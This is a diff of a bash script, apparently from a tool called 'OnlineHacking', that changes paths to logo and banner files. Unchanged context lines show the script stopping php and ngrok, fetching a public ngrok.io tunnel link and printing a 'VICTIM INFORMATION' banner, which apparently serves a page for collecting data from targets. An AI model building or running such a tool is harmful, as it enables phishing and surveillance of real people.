@@ -28,8 +28,8 @@ ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
 clear
-bash Logo.sh
-cat Logo.txt | lolcat
+bash OnlineHacking/Logo.sh
+cat OnlineHacking/Logo.txt | lolcat
 echo ""
 echo ""
  
@@ -57,7 +57,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat OnlineHacking/secnhack
                            echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo ""
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
@@ -106,7 +106,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat OnlineHacking/secnhack
                            echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo ""
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
@@ -155,7 +155,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat OnlineHacking/secnhack
                            echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo ""
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
